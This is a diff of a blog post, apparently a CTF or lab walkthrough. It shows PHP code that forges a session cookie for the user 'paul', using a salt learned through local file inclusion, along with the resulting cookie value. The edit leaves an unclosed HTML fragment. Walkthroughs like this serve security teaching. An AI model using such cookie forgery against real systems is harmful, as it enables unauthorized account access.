@@ -48,10 +48,10 @@ published: true
 <img src="https://i.ibb.co/G7KQwy8/7.png" alt="7" border="0">
 
 <p>So now we got LFI and now you can see how the cookie works, now let`s get our first door opened and generate cookie for our entrance</p>
-
-
+<br>
 <pre><span class="line">function makesession($username) {</span><br><span class="line"></span><br><span class="line">$max = strlen($username) - 1;</span><br><span class="line"></span><br><span class="line">$seed = rand(0, $max);</span><br><span class="line"></span><br><span class="line">$key = "s4lTy_stR1nG_".$username[$seed]."(!528.\/9890";</span><br><span class="line"></span><br><span class="line">$session_cookie = $username.md5($key);</span><br><span class="line"></span><br><span class="line">return $session_cookie;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">echo makesession("paul");</span>><br></pre>
 
+<p>That code will get 
 <pre><span class="line">paul47200b180ccd6835d25d034eeb6e6390</span><br></pre>
 
 
